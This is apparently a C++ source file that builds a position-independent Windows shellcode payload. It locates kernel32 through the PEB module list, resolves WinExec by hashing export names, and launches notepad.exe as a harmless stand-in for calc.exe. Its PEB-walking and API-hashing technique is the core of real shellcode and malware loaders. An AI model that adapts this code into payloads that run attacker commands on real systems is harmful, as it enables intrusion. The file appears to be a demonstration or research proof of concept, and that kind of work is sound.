import utils     ;
import winstructs;
import lbyte.stx ;

using namespace lbyte::stx;

extern "C" [[gnu::section(".payload"), gnu::used]]
auto payload() -> void
{
    using WinExecSig = u32(const u8*, u32);

    // -- PEB -------------------------------------------------
    // Using notepad.exe instead of calc.exe to ensure compatibility with my Wine testing environment.
    const auto cmd = ct::vstr<"notepad.exe\0">;
    const auto peb = get_peb<win::PEB>();

    // -- Kernel32 via InMemoryOrderModuleList ----------------
    auto kernel32 = module_entry<2>( peb )->DllBase;

    // -- PE headers → Export Directory ----------------------
    auto dos   = kernel32[0].as_p<win::DOS_HEADER>();

    auto nt    = kernel32[dos->e_lfanew                                     ].as_p<win::NT_HEADERS64    >();
    auto exp   = kernel32[nt->OptionalHeader.DataDirectory[0].VirtualAddress].as_p<win::EXPORT_DIRECTORY>();

    auto funcs = kernel32[exp->AddressOfFunctions   ].as_p<u32>();
    auto names = kernel32[exp->AddressOfNames       ].as_p<u32>();
    auto ords  = kernel32[exp->AddressOfNameOrdinals].as_p<u16>();

    // -- Hash walk ------------------------------------------
    for ( auto idx : range(exp->NumberOfNames) ) {
        auto rva  = funcs   [ords [idx].read<u16  >()].read<rva_s>();
        auto name = kernel32[names[idx].read<rva_s>()].as_p<u8   >();

        if ( FnvHash::cstr(name.raw()) == FnvHash::str<"WinExec"> ) {
            null << kernel32[rva].call<WinExecSig>(cmd.data(), 5);
            break;
        }
    }
}

